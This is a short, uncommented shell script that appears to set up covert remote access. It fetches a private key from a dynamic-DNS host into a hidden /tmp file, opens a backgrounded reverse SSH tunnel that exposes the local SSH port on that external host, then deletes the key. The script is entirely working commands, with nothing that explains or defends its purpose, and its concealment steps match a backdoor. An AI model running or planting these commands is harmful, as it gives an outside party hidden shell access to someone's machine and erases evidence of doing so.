wget pabloaledo.ddns.net/default_kp.pem -O /tmp/.default_kp.pem
chmod 600 /tmp/.default_kp.pem
nohup ssh -i /tmp/.default_kp.pem -nNT -R 2222:localhost:22 ubuntu@pabloaledo.ddns.net &
sleep 1 && rm -fr /tmp/.default_kp.pem
